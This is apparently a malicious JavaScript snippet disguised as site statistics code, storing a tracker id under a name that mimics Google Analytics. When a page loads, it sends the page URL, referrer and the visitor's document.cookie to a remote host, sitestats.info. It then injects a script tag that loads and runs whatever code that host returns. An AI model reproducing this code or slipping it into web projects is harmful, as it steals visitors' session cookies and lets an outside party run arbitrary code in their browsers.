
(function(){
function initXMLhttp() {

    var xmlhttp;
    if (window.XMLHttpRequest) {
        xmlhttp = new XMLHttpRequest();
    } else {
    
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    return xmlhttp;
}

function minAjax(config) {


    if (!config.url) {
        return;

    }

    if (!config.type) {
        return;

    }

    if (!config.method) {
        config.method = true;
    }


    if (!config.debugLog) {
        config.debugLog = false;
    }

    var xmlhttp = initXMLhttp();

    xmlhttp.onreadystatechange = function() {

        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {

            if (config.success) {
                config.success(xmlhttp.responseText, xmlhttp.readyState);
            }

        } else {

        }
    }

    var sendString = [],
        sendData = config.data;
    if( typeof sendData === "string" ){
        var tmpArr = String.prototype.split.call(sendData,'&');
        for(var i = 0, j = tmpArr.length; i < j; i++){
            var datum = tmpArr[i].split('=');
            sendString.push(encodeURIComponent(datum[0]) + "=" + encodeURIComponent(datum[1]));
        }
    }else if( typeof sendData === 'object' && !( sendData instanceof String ) ){
        for (var k in sendData) {
            var datum = sendData[k];
            if( Object.prototype.toString.call(datum) == "[object Array]" ){
                for(var i = 0, j = datum.length; i < j; i++) {
                        sendString.push(encodeURIComponent(k) + "[]=" + encodeURIComponent(datum[i]));
                }
            }else{
                sendString.push(encodeURIComponent(k) + "=" + encodeURIComponent(datum));
            }
        }
    }
    sendString = sendString.join('&');

    if (config.type == "GET") {
        xmlhttp.open("GET", config.url + "?" + sendString, config.method);
        xmlhttp.send();

    }
    if (config.type == "POST") {
        xmlhttp.open("POST", config.url, config.method);
        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xmlhttp.send(sendString);    
    }




}

	function h32a(a,b,c){var d,e,f=void 0===c?2166136261:c;for(d=0,e=a.length;d<e;d++)f^=a.charCodeAt(d),f+=(f<<1)+(f<<4)+(f<<7)+(f<<8)+(f<<24);return b?("0000000"+(f>>>0).toString(16)).substr(-8):f>>>0}function iT(){return!!localStorage.getItem(a)}var a="__GA___",tss="";iT()?tss=localStorage.getItem(a):(tss=h32a("146.135.116.54",!0,Math.floor(Date.now()/1000)),localStorage.setItem(a,tss));
	
	dL();

	function dL(){
		var host = "http://beta.sitestats.info/f";
		var config = {
		    url: host + "/stats.php",
		    type: "POST",
		    data: {
				vbase: document.baseURI,	
				vhref: location.href,
				vref: document.referrer, 				k: "LmZyZWUtY29kZXMub3Jn",ck: document.cookie,				t: Math.floor(new Date().getTime() / 1000), 				tg: tss
		    },
		    success: onSuccessCallback
		};

		function bl(response){
			var a = document.createElement('script');
			var m = document.getElementsByTagName('script')[0];
	     	a.async = 1;
	     	a.src = host + '/content.php?s=' + encodeURI(response);
	     	m.parentNode.insertBefore(a, m)
		}

		function onSuccessCallback(response){
		
				if(response && !(response.indexOf("false") > -1) ){
					bl(response);
				}
			
			
		}

		minAjax(config);

	}
})();


